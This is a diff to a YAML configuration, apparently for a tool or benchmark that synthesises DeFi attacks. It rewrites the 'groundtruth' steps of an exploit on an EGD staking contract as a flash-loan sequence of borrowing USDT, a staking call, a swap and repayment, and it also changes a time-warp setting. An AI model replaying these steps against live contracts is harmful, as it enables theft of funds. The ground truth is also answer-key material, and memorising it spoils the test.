@@ -37,16 +37,17 @@ extra_deployments:
   - "attackContract.setUp(address(usdt), address(egdstaking));"
 
 extra_statements:
-  - "vm.warp(block.timestamp + 60 * 60 * 24 * 10);"
+  - "vm.warp(block.timestamp + 54);"
 
 attack_goal_str: "usdt"
 
 groundtruth:
-  - ["borrow", "egd", "5000000000e18"]
-  - ["swap", "pair", "egd", "usdt", "egd.balanceOf(attacker)"]
+  - ["borrow", "owner", "usdt", "2000e18"]
+  - ["borrow", "pair", "usdt", "424526.221219952604636716e18"]
   - ["transaction", "egdstaking", "egd", "0"]
-  - ["swap", "pair", "usdt", "egd", "400000e18"]
-  - ["payback", "egd", "5000000000e18 * 1003 / 1000"]
+  - ["payback", "pair", "usdt", "uint256(424526.221219952604636716e18 * 1003) / 1000"]
+  - ["swap", "pair", "egd", "usdt", "egd.balanceOf(address(attacker))"]
+  - ["payback", "owner", "usdt", "2000e18 * 1003 / 1000"]
 
 # Information for search space building.
 roles:
@@ -66,6 +67,7 @@ roles:
       "egd": ["egd", "usdt"]
     is_oracle: true
     oracle: "pair"
+    is_lendpool: true
   "egdstaking":
     is_defientry: true
     hacked_assets: ["egd"]
